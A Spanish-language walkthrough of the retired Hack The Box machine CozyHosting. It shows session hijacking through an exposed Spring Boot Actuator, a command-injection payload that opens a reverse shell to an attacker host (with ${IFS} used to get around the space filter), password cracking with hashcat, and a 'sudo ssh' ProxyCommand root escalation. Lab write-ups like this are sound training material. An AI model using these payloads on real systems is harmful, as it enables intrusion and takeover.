---
machine: CozyHosting
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Spring Boot
state: Retired
tags: [spring-boot, actuator, session-hijack, command-injection, postgres, gtfobins]
---

# CozyHosting — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Una app **Spring Boot** detrás de nginx. El **Actuator** está expuesto sin autenticación: `/actuator/sessions` filtra los `JSESSIONID` activos y permite **secuestrar la sesión** de `kanderson`. En el panel de admin, el formulario de conexión SSH tiene **inyección de comandos** en el usuario. Del `.jar` salen credenciales de **PostgreSQL**; la tabla `users` guarda un bcrypt que se reutiliza como `josh`, y `sudo ssh` (GTFOBins) cierra.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 8.9p1
80/tcp open  http  nginx 1.18.0 (proxy a Spring Boot)
```

`/error` devuelve el JSON de Spring y `/actuator` lista `health, beans, env, sessions, mappings`.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
curl -s http://cozyhosting.htb/actuator/sessions
# {"<JSESSIONID>":"kanderson","<JSESSIONID>":"UNAUTHORIZED"}
```

El JSON va **al revés de lo que parece**: la clave es el identificador de sesión y el valor, el usuario. Con esa cookie se entra en `/admin`, donde el formulario "Automatic SSH connection" pasa `username` y `host` a un `Runtime.exec` sin sanear:

```text
username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
```

`host` se valida con una regex, el usuario no: ahí está el fallo. El campo **rechaza espacios**, así que se reconstruyen con `${IFS}` o se envía el comando en base64 (`echo <b64>|base64 -d|bash`). Shell como el usuario de la app.

## Movimiento lateral

- De la cuenta de la aplicación se pasa a `josh` con el hash de la tabla `users` de PostgreSQL; el `.jar` sólo aporta el acceso a la base.

## Escalada de privilegios

```bash
unzip -p /app/cloudhosting-0.0.1.jar BOOT-INF/classes/application.properties
```

```text
spring.datasource.username=postgres
spring.datasource.password=<password>
```

```bash
psql -h 127.0.0.1 -U postgres -c 'select * from users;'
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh josh@<IP>
```

```bash
sudo -l
# (root) /usr/bin/ssh *
```

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Cookie de sesión**: sin la sesión de un admin, `/admin` redirige al login.
- **Payload con espacios**: el campo no admite espacios en claro; codificar en base64 (`echo <b64>|base64 -d|bash`).
- **`sudo ssh`**: sin `-o ProxyCommand` la escalada no funciona; es el ejemplo clásico de GTFOBins.

- Un Actuator expuesto publica sesiones, variables de entorno y beans: es un panel de administración sin contraseña.
- Validar un campo y olvidar el de al lado es un patrón habitual.
- Credenciales en `application.properties` dentro del `.jar` están en claro.
- `sudo` sobre `ssh` equivale a root.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
